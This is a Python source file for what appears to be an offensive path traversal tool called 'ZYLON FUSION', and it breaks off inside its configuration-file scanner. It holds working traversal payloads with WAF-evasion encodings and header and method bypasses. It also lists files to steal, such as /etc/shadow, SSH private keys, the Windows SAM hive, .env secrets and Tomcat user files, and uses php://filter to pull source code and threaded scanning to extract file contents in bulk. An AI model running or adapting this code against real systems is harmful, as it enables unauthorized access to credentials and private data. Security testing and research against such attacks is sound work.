#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Path Traversal Engine
Fused from: PTScanner (https://github.com/ApachSAL/PTScanner)
           + PayloadsAllTheThings + Custom Zylon Techniques
Capabilities:
  - Path traversal detection (../ traversal)
  - Directory traversal with depth fuzzing
  - Windows + Linux path targets
  - Encoding bypass (URL encoding, double URL encoding, Unicode, base64)
  - Tomcat/JBoss/WebLogic specific paths
  - Configuration file extraction
  - Source code reading via traversal
  - Filter/WAF evasion techniques
  - Mass path traversal scanner
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import os
import time
import base64
import urllib.parse
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.shared_infra import shared_session, regex_cache, PayloadInjector, WAFEvasionMixin
from core.var import USER_AGENTS, DEFAULT_TIMEOUT

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# PATH TRAVERSAL PAYLOAD DATABASE
# ============================================================================

# Basic traversal sequences
TRAVERSAL_SEQUENCES = [
    "../", "..\\", "..../", "....\\",
    "..%2f", "..%5c",
    "%2e%2e%2f", "%2e%2e%5c",
    "%2e%2e/", "..%252f", "..%255c",
    "%252e%252e%252f", "%252e%252e%255c",
    "..%c0%af", "..%c1%9c",
    "..%ef%bc%8f",  # fullwidth slash
    "..%e0%80%af",  # overlong UTF-8
    "..%f0%80%80%af",  # 4-byte overlong
    "....//", "....\\\\",
    "..;/",  # Tomcat semicolon bypass
    "..%3f/",  # Question mark bypass
    "..%26/",  # Ampersand bypass
    "..%23/",  # Hash bypass
]

# Encoding bypass methods for path traversal
ENCODING_BYPASS_METHODS = {
    "none": lambda p: p,
    "url_single": lambda p: urllib.parse.quote(p, safe=''),
    "url_double": lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
    "dot_encoding": lambda p: p.replace(".", "%2e").replace("/", "%2f").replace("\\", "%5c"),
    "double_dot_encoding": lambda p: p.replace(".", "%252e").replace("/", "%252f").replace("\\", "%255c"),
    "unicode_overlong": lambda p: p.replace("../", "..%c0%af").replace("..\\", "..%c1%9c"),
    "fullwidth_slash": lambda p: p.replace("/", "%ef%bc%8f"),
    "mixed_encoding": lambda p: p.replace("..", "%2e%2e").replace("/", "%2f"),
    "null_byte": lambda p: p + "%00",
    "tomcat_semicolon": lambda p: p.replace("../", "..;/"),
    "backslash_mixed": lambda p: p.replace("/", "\\"),
    "double_dot_slash": lambda p: p.replace("../", "....//"),
    "dot_dash": lambda p: p.replace("../", "..-/"),
    "unicode_fullwidth": lambda p: p.replace("..", "\uff0e\uff0e").replace("/", "\uff0f"),
    "html_entity": lambda p: p.replace(".", "&#46;").replace("/", "&#47;"),
    "base64_encode": lambda p: base64.b64encode(p.encode()).decode(),
}

# Linux configuration files for extraction
LINUX_CONFIG_FILES = [
    # Apache
    "/etc/apache2/apache2.conf",
    "/etc/apache2/sites-enabled/000-default.conf",
    "/etc/apache2/sites-available/default",
    "/etc/httpd/conf/httpd.conf",
    "/etc/apache2/mods-enabled/",
    "/etc/apache2/ports.conf",
    # Nginx
    "/etc/nginx/nginx.conf",
    "/etc/nginx/sites-enabled/default",
    "/etc/nginx/sites-available/default",
    "/etc/nginx/conf.d/default.conf",
    # PHP
    "/etc/php/php.ini",
    "/etc/php7/php.ini",
    "/etc/php8/php.ini",
    "/etc/php/7.4/apache2/php.ini",
    "/etc/php/8.0/apache2/php.ini",
    "/etc/php/8.1/apache2/php.ini",
    "/etc/php/8.2/apache2/php.ini",
    # MySQL/MariaDB
    "/etc/mysql/my.cnf",
    "/etc/mysql/mysql.conf.d/mysqld.cnf",
    "/etc/my.cnf",
    # PostgreSQL
    "/etc/postgresql/postgresql.conf",
    "/etc/postgresql/12/main/postgresql.conf",
    "/etc/postgresql/14/main/postgresql.conf",
    # Redis
    "/etc/redis/redis.conf",
    # SSH
    "/etc/ssh/sshd_config",
    "/etc/ssh/ssh_config",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/id_rsa",
    "/home/{user}/.ssh/id_rsa",
    "/home/{user}/.ssh/authorized_keys",
    # System
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/fstab",
    "/etc/crontab",
    "/etc/sudoers",
    "/etc/issue",
    "/etc/redhat-release",
    "/etc/debian_version",
    "/etc/lsb-release",
    "/proc/self/environ",
    "/proc/version",
    # Web app configs
    "/var/www/html/config.php",
    "/var/www/html/wp-config.php",
    "/var/www/html/.htaccess",
    "/var/www/html/.env",
    "/var/www/html/settings.py",
    "/var/www/html/application.properties",
    "/var/www/html/web.config",
    "/var/www/config.php",
    "/var/www/wp-config.php",
    "/app/config.php",
    "/app/.env",
    "/app/settings.py",
    "/app/application.yml",
    # Docker
    "/.dockerenv",
    "/proc/1/cgroup",
    # Logs
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/syslog",
]

# Windows configuration files for extraction
WINDOWS_CONFIG_FILES = [
    "C:/Windows/win.ini",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/Windows/System32/drivers/etc/lmhosts",
    "C:/Windows/System32/config/SAM",
    "C:/Windows/System32/config/SYSTEM",
    "C:/Windows/System32/config/SOFTWARE",
    "C:/Windows/repair/SAM",
    "C:/Windows/repair/SYSTEM",
    "C:/Windows/Panther/unattend.xml",
    "C:/Windows/Panther/unattend.txt",
    "C:/Windows/Panther/unattend.xml.bak",
    "C:/inetpub/wwwroot/web.config",
    "C:/inetpub/wwwroot/applicationHost.config",
    "C:/Users/Administrator/.ssh/id_rsa",
    "C:/Users/Administrator/NTUSER.DAT",
    "C:/ProgramData/mysql/my.ini",
    "C:/ProgramData/PostgreSQL/data/postgresql.conf",
    "C:/boot.ini",
    "C:/autoexec.bat",
    "C:/Windows/debug/NetSetup.log",
    "C:/Windows/system32/config/AppEvent.Evt",
    "C:/Windows/system32/config/SecEvent.Evt",
    "C:/Windows/system32/config/default",
    "C:/Windows/temp/",
    "C:/Windows/system32/inetsrv/MetaBase.xml",
]

# Tomcat/JBoss/WebLogic specific paths
JAVA_APP_SERVER_PATHS = [
    # Apache Tomcat
    "/usr/local/tomcat/conf/tomcat-users.xml",
    "/usr/local/tomcat/conf/server.xml",
    "/usr/local/tomcat/conf/context.xml",
    "/usr/local/tomcat/conf/web.xml",
    "/opt/tomcat/conf/tomcat-users.xml",
    "/opt/tomcat/conf/server.xml",
    "/opt/tomcat/conf/context.xml",
    "/opt/tomcat/conf/web.xml",
    "/etc/tomcat/tomcat-users.xml",
    "/etc/tomcat/server.xml",
    "/etc/tomcat/context.xml",
    "/etc/tomcat/web.xml",
    "/etc/tomcat8/tomcat-users.xml",
    "/etc/tomcat9/tomcat-users.xml",
    "/var/lib/tomcat/conf/tomcat-users.xml",
    "/var/lib/tomcat8/conf/tomcat-users.xml",
    "/var/lib/tomcat9/conf/tomcat-users.xml",
    # JBoss/WildFly
    "/opt/jboss/standalone/configuration/standalone.xml",
    "/opt/jboss/domain/configuration/domain.xml",
    "/opt/jboss/standalone/configuration/application-users.properties",
    "/opt/jboss/standalone/configuration/mgmt-users.properties",
    "/opt/wildfly/standalone/configuration/standalone.xml",
    "/opt/wildfly/domain/configuration/domain.xml",
    "/opt/jboss/jboss-as/server/default/conf/props/jboss-users.properties",
    # Oracle WebLogic
    "/opt/oracle/weblogic/user_projects/domains/base_domain/config/config.xml",
    "/opt/oracle/weblogic/user_projects/domains/base_domain/security/boot.properties",
    "/opt/oracle/weblogic/wlserver/server/lib/weblogic.jar",
    "/u01/oracle/weblogic/config/config.xml",
    "/u01/oracle/weblogic/security/boot.properties",
    # Spring Boot
    "/app/application.properties",
    "/app/application.yml",
    "/app/application.yaml",
    "/app/config/application.properties",
    "/app/BOOT-INF/classes/application.properties",
    "/app/BOOT-INF/classes/application.yml",
]

# Source code file patterns
SOURCE_CODE_FILES = [
    "/var/www/html/index.php",
    "/var/www/html/config.php",
    "/var/www/html/functions.php",
    "/var/www/html/database.php",
    "/var/www/html/login.php",
    "/var/www/html/register.php",
    "/var/www/html/admin.php",
    "/var/www/html/upload.php",
    "/var/www/html/api/index.php",
    "/var/www/html/includes/db.php",
    "/var/www/html/includes/config.php",
    "/var/www/html/includes/auth.php",
    "/var/www/html/app/config/database.yml",
    "/var/www/html/app/config/parameters.yml",
    "/var/www/html/.env",
    "/var/www/html/.env.local",
    "/var/www/html/.env.production",
    "/app/main.py",
    "/app/app.py",
    "/app/settings.py",
    "/app/config.py",
    "/app/requirements.txt",
]

# Detection signatures for path traversal responses
TRAVERSAL_SIGNATURES = {
    "linux_passwd": [r"root:x:0:0:", r"nobody:x:", r":/bin/(?:ba)?sh$"],
    "linux_shadow": [r"root:\$6\$", r"root:\$5\$", r"root:\$1\$"],
    "linux_hosts": [r"127\.0\.0\.1\s+localhost", r"::1\s+localhost"],
    "linux_issue": [r"\\n \\l", r"Ubuntu", r"Debian", r"CentOS"],
    "windows_ini": [r"\[fonts\]", r"\[extensions\]", r"COM1\s*="],
    "windows_hosts": [r"127\.0\.0\.1\s+localhost"],
    "apache_conf": [r"ServerRoot", r"DocumentRoot", r"Listen\s+\d+", r"<Directory"],
    "nginx_conf": [r"worker_processes", r"server\s*\{", r"location\s+/"],
    "php_config": [r"engine\s*=", r"short_open_tag", r"disable_functions", r"open_basedir"],
    "mysql_conf": [r"\[mysqld\]", r"datadir\s*=", r"socket\s*="],
    "tomcat_users": [r"<tomcat-users", r"<user\s+username", r"roles="],
    "jboss_config": [r"<server", r"<management", r"<security-realm"],
    "weblogic_config": [r"<domain", r"<name>", r"<listen-address>"],
    "spring_config": [r"spring\.", r"server\.port", r"datasource"],
    "dockerenv": [r"docker", r"container", r"kubepods"],
    "env_file": [r"DB_PASSWORD", r"SECRET_KEY", r"APP_KEY", r"DATABASE_URL"],
    "ssh_key": [r"BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY"],
    "python_source": [r"import\s+", r"from\s+\w+\s+import", r"def\s+\w+"],
    "php_source": [r"<\?php", r"<\?=", r"\$_GET", r"\$_POST", r"mysqli_connect"],
    "crontab": [r"^\*\s+\*\s+\*\s+\*\s+\*", r"^@\w+"],
}

# Common parameters for path traversal
TRAVERSAL_PARAM_NAMES = [
    "file", "path", "page", "doc", "include", "template", "view",
    "content", "document", "folder", "dir", "show", "read", "load",
    "img", "image", "lang", "style", "pdf", "action", "module",
    "catalog", "recipe", "item", "body", "cat", "inc", "file_name",
    "filename", "url", "return", "next", "redirect", "src", "dest",
    "destination", "out", "output", "log", "skin", "debug", "test",
    "conf", "config", "site", "layout", "partial", "component",
    "download", "attachment", "resource", "data", "input",
]


class PathTraversalEngine(WAFEvasionMixin):
    """Path Traversal Engine - Fused from PTScanner + PayloadsAllTheThings"""

    def __init__(self, target_url=None, parameter=None, method="GET", data=None,
                 headers=None, cookies=None, proxy=None, timeout=10, threads=15):
        self.target_url = target_url
        self.parameter = parameter or "file"
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.session = shared_session
        self.findings = []
        self.lock = threading.Lock()

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    def _send_request(self, url, method=None, data=None, headers=None):
        """Send HTTP request with error handling"""
        try:
            m = method or self.method
            d = data or self.data
            h = headers or self.headers
            if m == "GET":
                resp = self.session.get(url, params=d, headers=h,
                                       cookies=self.cookies, timeout=self.timeout,
                                       allow_redirects=True)
            else:
                resp = self.session.post(url, data=d, headers=h,
                                        cookies=self.cookies, timeout=self.timeout,
                                        allow_redirects=True)
            return resp
        except Exception:
            return None

    def _inject_payload(self, payload, param=None):
        """Inject payload into the target parameter"""
        p = param or self.parameter
        if not p:
            return None
        sep = "&" if "?" in self.target_url else "?"
        url = f"{self.target_url}{sep}{p}={urllib.parse.quote(payload, safe='')}"
        return self._send_request(url, method="GET")

    def _inject_payload_raw(self, payload, param=None):
        """Inject payload without URL encoding"""
        p = param or self.parameter
        if not p:
            return None
        sep = "&" if "?" in self.target_url else "?"
        url = f"{self.target_url}{sep}{p}={payload}"
        return self._send_request(url, method="GET")

    def _check_signatures(self, content, file_type=None):
        """Check response content against path traversal signatures"""
        if content is None:
            return []
        text = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
        matches = []
        for sig_name, patterns in TRAVERSAL_SIGNATURES.items():
            if file_type and sig_name != file_type:
                continue
            for pattern in patterns:
                if regex_cache.search(pattern, text, re.IGNORECASE | re.MULTILINE):
                    matches.append(sig_name)
                    break
        return list(set(matches))

    def _build_traversal(self, depth, file_path, traversal_seq="../"):
        """Build path traversal payload with specified depth and sequence"""
        prefix = traversal_seq * depth
        target = file_path.lstrip("/")
        return prefix + target

    def _try_base64_decode(self, content):
        """Attempt to extract and decode base64 content from response"""
        b64_match = regex_cache.search(r'[A-Za-z0-9+/]{20,}={0,2}', content)
        if b64_match:
            try:
                decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
                if len(decoded) > 5:
                    return decoded
            except Exception:
                pass
        return None

    # ========================================================================
    # SCAN: Path Traversal Detection
    # ========================================================================

    def detect_traversal(self, url=None, param=None):
        """Detect path traversal vulnerability"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] Path Traversal Detection on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "parameter": parameter,
                "os_detected": None,
                "best_payload": None,
                "working_encodings": [],
                "files_read": [],
            },
            "scan_type": "path_traversal_detect",
        }

        # Get baseline response for comparison
        baseline_resp = self._inject_payload("testbaseline123", parameter)
        baseline_length = len(baseline_resp.text) if baseline_resp else 0
        baseline_code = baseline_resp.status_code if baseline_resp else 0

        # Test Linux targets with various traversal methods
        test_files = [
            ("/etc/passwd", "linux_passwd"),
            ("/etc/hosts", "linux_hosts"),
        ]

        found = False
        for file_path, sig_type in test_files:
            if found:
                break
            for depth in range(1, 10):
                if found:
                    break
                for trav_seq in TRAVERSAL_SEQUENCES[:8]:
                    if found:
                        break
                    payload = self._build_traversal(depth, file_path, trav_seq)
                    resp = self._inject_payload_raw(payload, parameter)
                    if resp and resp.status_code == 200:
                        # Check for signature match
                        sigs = self._check_signatures(resp.text, sig_type)
                        if sigs:
                            results["vulnerable"] = True
                            results["details"]["os_detected"] = "Linux"
                            results["details"]["best_payload"] = payload
                            results["details"]["working_encodings"].append(trav_seq)
                            results["findings"].append({
                                "type": "path_traversal",
                                "file": file_path,
                                "depth": depth,
                                "traversal_sequence": trav_seq,
                                "payload": payload,
                                "signatures": sigs,
                                "content_length": len(resp.text),
                            })
                            # Extract file content preview
                            results["details"]["files_read"].append({
                                "file": file_path,
                                "size": len(resp.text),
                                "preview": resp.text[:200],
                            })
                            self._print(f"[+] TRAVERSAL DETECTED! File: {file_path}, "
                                       f"Depth: {depth}, Seq: {trav_seq}", GREEN)
                            found = True
                            break

                        # Check for significant response difference (might be filtered)
                        if abs(len(resp.text) - baseline_length) > 100:
                            results["findings"].append({
                                "type": "possible_traversal_filtered",
                                "file": file_path,
                                "depth": depth,
                                "traversal_sequence": trav_seq,
                                "payload": payload,
                                "note": "Response significantly different from baseline - content may be filtered",
                                "baseline_length": baseline_length,
                                "response_length": len(resp.text),
                            })

        # Test Windows targets
        if not found:
            win_tests = [
                ("C:/Windows/win.ini", "windows_ini"),
                ("C:/Windows/System32/drivers/etc/hosts", "windows_hosts"),
            ]
            for file_path, sig_type in win_tests:
                if found:
                    break
                for depth in range(1, 8):
                    if found:
                        break
                    payload = self._build_traversal(depth, file_path, "..\\")
                    resp = self._inject_payload_raw(payload, parameter)
                    if resp and resp.status_code == 200:
                        sigs = self._check_signatures(resp.text, sig_type)
                        if sigs:
                            results["vulnerable"] = True
                            results["details"]["os_detected"] = "Windows"
                            results["details"]["best_payload"] = payload
                            results["findings"].append({
                                "type": "path_traversal_windows",
                                "file": file_path,
                                "depth": depth,
                                "payload": payload,
                                "signatures": sigs,
                            })
                            self._print(f"[+] WINDOWS TRAVERSAL! File: {file_path}", GREEN)
                            found = True
                            break

        if not results["vulnerable"]:
            self._print("[-] No path traversal vulnerability detected", YELLOW)

        return results

    # ========================================================================
    # SCAN: Depth Fuzzing
    # ========================================================================

    def fuzz_depth(self, url=None, param=None, max_depth=10):
        """Fuzz traversal depth from 1 to max_depth"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] Path Traversal Depth Fuzzing (1-{max_depth}) on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "parameter": parameter,
                "min_working_depth": None,
                "max_working_depth": None,
                "working_depths": [],
                "os_detected": None,
                "files_read": [],
            },
            "scan_type": "path_traversal_depth_fuzz",
        }

        test_file = "/etc/passwd"
        sig_type = "linux_passwd"

        # Use threading for parallel depth testing
        def test_depth(depth):
            payload = self._build_traversal(depth, test_file, "../")
            resp = self._inject_payload(payload, parameter)
            if resp and resp.status_code == 200:
                sigs = self._check_signatures(resp.text, sig_type)
                return {
                    "depth": depth,
                    "payload": payload,
                    "signatures": sigs,
                    "status_code": resp.status_code,
                    "content_length": len(resp.text),
                    "content": resp.text,
                }
            return None

        working_depths = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_depth, d): d for d in range(1, max_depth + 1)}
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and result["signatures"]:
                        results["vulnerable"] = True
                        working_depths.append(result["depth"])
                        results["findings"].append({
                            "type": "depth_fuzz_hit",
                            "depth": result["depth"],
                            "payload": result["payload"],
                            "content_length": result["content_length"],
                        })
                        self._print(f"    Depth {result['depth']}: HIT "
                                   f"({result['content_length']} bytes)", GREEN)
                except Exception:
                    pass

        if working_depths:
            working_depths.sort()
            results["details"]["min_working_depth"] = working_depths[0]
            results["details"]["max_working_depth"] = working_depths[-1]
            results["details"]["working_depths"] = working_depths
            results["details"]["os_detected"] = "Linux"

            # Read the file at the minimum working depth
            payload = self._build_traversal(working_depths[0], test_file, "../")
            resp = self._inject_payload(payload, parameter)
            if resp:
                results["details"]["files_read"].append({
                    "file": test_file,
                    "size": len(resp.text),
                    "preview": resp.text[:300],
                })

            self._print(f"[+] Path traversal works at depths: {working_depths}", GREEN)
        else:
            # Try Windows with backslash traversal
            self._print(f"[*] Trying Windows depth fuzzing...", CYAN)
            win_file = "C:/Windows/win.ini"
            for depth in range(1, max_depth + 1):
                payload = self._build_traversal(depth, win_file, "..\\")
                resp = self._inject_payload_raw(payload, parameter)
                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text, "windows_ini")
                    if sigs:
                        results["vulnerable"] = True
                        results["details"]["os_detected"] = "Windows"
                        results["details"]["working_depths"].append(depth)
                        results["findings"].append({
                            "type": "depth_fuzz_windows",
                            "depth": depth,
                            "payload": payload,
                        })
                        self._print(f"[+] Windows traversal at depth {depth}", GREEN)
                        break

        if not results["vulnerable"]:
            self._print("[-] Depth fuzzing did not find path traversal", YELLOW)

        return results

    # ========================================================================
    # SCAN: Read Specific File
    # ========================================================================

    def read_file(self, url=None, param=None, file_path="/etc/passwd"):
        """Read a specific file via path traversal"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] Reading {file_path} via path traversal", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "file_path": file_path,
                "content": None,
                "content_length": 0,
                "encoding_used": None,
                "depth_used": None,
                "decoded_content": None,
            },
            "scan_type": "path_traversal_read_file",
        }

        # Determine signature type based on file path
        sig_type = None
        for sig_name in TRAVERSAL_SIGNATURES:
            keywords = sig_name.split("_")
            if any(kw in file_path.lower() for kw in keywords):
                sig_type = sig_name
                break

        # Try with standard traversal first
        for depth in range(1, 10):
            payload = self._build_traversal(depth, file_path, "../")
            resp = self._inject_payload(payload, parameter)
            if resp and resp.status_code == 200:
                sigs = self._check_signatures(resp.text, sig_type)
                content = resp.text.strip()

                if sigs or len(content) > 30:
                    results["vulnerable"] = True
                    results["details"]["content"] = content
                    results["details"]["content_length"] = len(content)
                    results["details"]["encoding_used"] = "standard"
                    results["details"]["depth_used"] = depth
                    results["findings"].append({
                        "file": file_path,
                        "depth": depth,
                        "encoding": "standard",
                        "signatures": sigs,
                        "content_length": len(content),
                    })
                    self._print(f"[+] File read successful: {file_path} "
                               f"({len(content)} bytes, depth={depth})", GREEN)
                    return results

        # Try with URL encoding
        for depth in range(1, 10):
            payload = self._build_traversal(depth, file_path, "%2e%2e%2f")
            resp = self._inject_payload_raw(payload, parameter)
            if resp and resp.status_code == 200:
                sigs = self._check_signatures(resp.text, sig_type)
                content = resp.text.strip()
                if sigs or len(content) > 30:
                    results["vulnerable"] = True
                    results["details"]["content"] = content
                    results["details"]["content_length"] = len(content)
                    results["details"]["encoding_used"] = "url_encoded"
                    results["details"]["depth_used"] = depth
                    results["findings"].append({
                        "file": file_path,
                        "depth": depth,
                        "encoding": "url_encoded",
                        "signatures": sigs,
                    })
                    self._print(f"[+] File read via URL encoding: {file_path} (depth={depth})", GREEN)
                    return results

        # Try php://filter for source code extraction (PHP-specific)
        if file_path.endswith(('.php', '.inc', '.phtml', '.php5', '.php7')):
            for depth in range(1, 8):
                filter_payload = f"php://filter/convert.base64-encode/resource={file_path}"
                payload = self._build_traversal(depth, "", "../") + filter_payload
                resp = self._inject_payload(payload, parameter)
                if resp and resp.status_code == 200:
                    decoded = self._try_base64_decode(resp.text)
                    if decoded:
                        results["vulnerable"] = True
                        results["details"]["content"] = decoded
                        results["details"]["decoded_content"] = decoded
                        results["details"]["content_length"] = len(decoded)
                        results["details"]["encoding_used"] = "php_filter_base64"
                        results["findings"].append({
                            "file": file_path,
                            "depth": depth,
                            "encoding": "php_filter_base64",
                            "decoded_length": len(decoded),
                        })
                        self._print(f"[+] Source code extracted via php://filter: "
                                   f"{file_path} ({len(decoded)} bytes)", GREEN)
                        return results

        self._print(f"[-] Could not read {file_path}", YELLOW)
        return results

    # ========================================================================
    # SCAN: Encoding Bypass Testing
    # ========================================================================

    def bypass_encoding(self, url=None, param=None):
        """Test various encoding bypass methods for path traversal"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] Encoding Bypass Testing on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "parameter": parameter,
                "bypasses_working": [],
                "baseline_blocked": False,
                "total_tested": 0,
                "successful_encodings": [],
            },
            "scan_type": "path_traversal_encoding_bypass",
        }

        # Baseline test
        baseline_payload = "../../../../../../etc/passwd"
        baseline_resp = self._inject_payload(baseline_payload, parameter)
        if baseline_resp and baseline_resp.status_code == 200:
            sigs = self._check_signatures(baseline_resp.text, "linux_passwd")
            if sigs:
                results["vulnerable"] = True
                results["details"]["bypasses_working"].append({
                    "encoding": "none",
                    "payload": baseline_payload,
                })
                results["details"]["successful_encodings"].append("none")
                self._print(f"[+] Standard traversal works (no bypass needed)", GREEN)
                return results

        if baseline_resp is None or (baseline_resp and baseline_resp.status_code in [403, 401, 501, 503]):
            results["details"]["baseline_blocked"] = True
            self._print(f"[!] Standard traversal blocked - testing encodings...", YELLOW)

        # Test each encoding method
        test_file = "/etc/passwd"

        def test_encoding(encoding_name, encoding_func):
            for depth in [4, 6, 8]:
                base = "../" * depth + test_file.lstrip("/")
                try:
                    encoded = encoding_func(base)
                except Exception:
                    continue

                resp = self._inject_payload_raw(encoded, parameter)
                results["details"]["total_tested"] += 1

                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text, "linux_passwd")
                    if sigs:
                        return {
                            "encoding": encoding_name,
                            "depth": depth,
                            "payload": encoded[:120],
                            "signatures": sigs,
                        }
            return None

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {}
            for enc_name, enc_func in ENCODING_BYPASS_METHODS.items():
                future = executor.submit(test_encoding, enc_name, enc_func)
                futures[future] = enc_name

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        results["vulnerable"] = True
                        results["details"]["bypasses_working"].append(result)
                        results["details"]["successful_encodings"].append(result["encoding"])
                        results["findings"].append({
                            "type": "encoding_bypass_success",
                            **result,
                        })
                        self._print(f"[+] ENCODING BYPASS: {result['encoding']} "
                                   f"(depth={result['depth']})", GREEN)
                except Exception:
                    pass

        # Additional: Test header-based evasion
        evasion_headers_list = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/etc/passwd"},
            {"X-Rewrite-URL": "/etc/passwd"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "localhost"},
        ]

        for extra_h in evasion_headers_list:
            h = self.headers.copy()
            h.update(extra_h)
            for depth in [4, 6]:
                payload = self._build_traversal(depth, test_file, "../")
                sep = "&" if "?" in target_url else "?"
                url = f"{target_url}{sep}{parameter}={urllib.parse.quote(payload)}"
                resp = self._send_request(url, method="GET", headers=h)
                results["details"]["total_tested"] += 1
                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text, "linux_passwd")
                    if sigs:
                        hdr_name = list(extra_h.keys())[0]
                        results["vulnerable"] = True
                        results["details"]["bypasses_working"].append({
                            "encoding": f"header_bypass_{hdr_name}",
                            "depth": depth,
                            "header": extra_h,
                        })
                        results["details"]["successful_encodings"].append(f"header:{hdr_name}")
                        self._print(f"[+] HEADER BYPASS: {hdr_name}!", GREEN)
                        break

        # Test HTTP method switching
        for method in ["POST", "PUT", "OPTIONS", "PATCH"]:
            for depth in [4, 6]:
                payload = self._build_traversal(depth, test_file, "../")
                sep = "&" if "?" in target_url else "?"
                url = f"{target_url}{sep}{parameter}={urllib.parse.quote(payload)}"
                resp = self._send_request(url, method=method)
                results["details"]["total_tested"] += 1
                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text, "linux_passwd")
                    if sigs:
                        results["vulnerable"] = True
                        results["details"]["bypasses_working"].append({
                            "encoding": f"method_bypass_{method}",
                            "depth": depth,
                        })
                        results["details"]["successful_encodings"].append(f"method:{method}")
                        self._print(f"[+] METHOD BYPASS: {method}!", GREEN)
                        break

        if not results["vulnerable"]:
            self._print("[-] No encoding bypass successful", YELLOW)

        return results

    # ========================================================================
    # SCAN: Configuration File Scanner
    # ========================================================================

    def scan_config_files(self, url=None, param=None):
        """Scan for configuration files via path traversal"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] Config File Scanning via path traversal on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "files_found": [],
                "total_tested": 0,
                "total_found": 0,
                "os_detected": None,
                "categories_found": set(),
            },
            "scan_type": "path_traversal_config_scan",
        }

        # Determine OS first
        os_type = None
        for depth in range(1, 8):
            payload = self._build_traversal(depth, "/etc/passwd", "../")
            resp = self._inject_payload(payload, parameter)
            if resp and resp.status_code == 200:
                sigs = self._check_signatures(resp.text, "linux_passwd")
                if sigs:
                    os_type = "Linux"
                    break

        if not os_type:
            for depth in range(1, 8):
                payload = self._build_traversal(depth, "C:/Windows/win.ini", "..\\")
                resp = self._inject_payload_raw(payload, parameter)
                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text, "windows_ini")
                    if sigs:
                        os_type = "Windows"
                        break

        results["details"]["os_detected"] = os_type

        # Select files to scan based on OS
        files_to_scan = []
        if os_type == "Windows":
            files_to_scan = WINDOWS_CONFIG_FILES
        else:
            files_to_scan = LINUX_CONFIG_FILES + JAVA_APP_SERVER_PATHS + SOURCE_CODE_FILES

        # Parallel scanning with threading
        def scan_single_file(file_path):
            for depth in range(1, 8):
                trav = "..\\" if os_type == "Windows" else "../"
                payload = self._build_traversal(depth, file_path, trav)
                if os_type == "Windows":
                    resp = self._inject_payload_raw(payload, parameter)
                else:
                    resp = self._inject_payload(payload, parameter)
                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text)
                    content = resp.text.strip()
                    if sigs or len(content) > 30:
                        return {
                            "file": file_path,
                            "depth": depth,
                            "signatures": sigs,
                            "content_length": len(content),
                            "preview": content[:300],
                        }
            return None

        self._print(f"[*] Scanning {len(files_to_scan)} config files...", CYAN)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(scan_single_file, f): f for f in files_to_scan}
            for future in as_completed(futures):
                results["details"]["total_tested"] += 1
                try:
                    result = future.result()
                    if result:
                        results["vulnerable"] = True
                        results["details"]["total_found"] += 1
                        results["details"]["files_found"].append(result)

                        # Categorize finding
                        category = "unknown"
                        file_lower = result["file"].lower()
                        if "tomcat" in file_lower or "jboss" in file_lower or "weblogic" in file_lower:
                            category = "java_app_server"
                        elif "apache" in file_lower or "nginx" in file_lower or "httpd" in file_lower:
                            category = "web_server"
                        elif "php" in file_lower:
                            category = "php"
                        elif "mysql" in file_lower or "postgres" in file_lower or "redis" in file_lower:
                            category = "database"
                        elif "ssh" in file_lower or "sshd" in file_lower:
                            category = "ssh"
                        elif ".env" in file_lower or "config" in file_lower:
                            category = "app_config"
                        elif "source" in file_lower or ".php" in file_lower or ".py" in file_lower:
                            category = "source_code"
                        elif "log" in file_lower:
                            category = "logs"
                        else:
                            category = "system"

                        results["details"]["categories_found"].add(category)
                        results["findings"].append({
                            "type": "config_file_found",
                            "category": category,
                            **result,
                        })
                        self._print(f"    [+] {result['file']} "
                                   f"({result['content_length']} bytes, "
                                   f"category: {category})", GREEN)
                except Exception:
                    pass

